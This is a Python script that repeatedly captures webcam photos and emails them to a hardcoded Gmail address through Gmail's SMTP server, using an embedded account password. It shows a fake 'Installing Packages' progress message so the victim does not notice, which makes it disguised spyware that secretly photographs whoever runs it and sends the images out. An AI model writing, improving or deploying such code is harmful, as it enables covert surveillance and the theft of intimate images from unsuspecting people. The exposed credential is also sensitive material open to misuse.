import cv2
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import os
from colorama import init, Fore, Back, Style

counter = 0
try:
    while True:
        cap = cv2.VideoCapture(0)

        ret, frame = cap.read()
       
       
        counter += 1
        cv2.imwrite('1captured_image.jpg', frame)

        cap.release()

        cv2.waitKey(0)
        cv2.destroyAllWindows()
        def clear():
            os.system('cls' if os.name == 'nt' else 'clear')
        clear()
        print(f"{Fore.CYAN}Please Wait Installing Packages {counter}%")


        sender_email = "hillwild096@gmail.com"
        receiver_email = "hillwild096@gmail.com"


        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = "Testing picture email"


        with open("1captured_image.jpg", "rb") as attachment:
            
            part = MIMEImage(attachment.read(), name="picture.jpg")
            msg.attach(part)


        session = smtplib.SMTP('smtp.gmail.com', 587)
        session.starttls()
        session.login(sender_email, "niafmomyhmpmbqjd")


        text = msg.as_string()
        session.sendmail(sender_email, receiver_email, text)


        session.quit()
        try:
            os.remove("1captured_image.jpg")
        except:
            pass


except Exception as e:
    print(e)

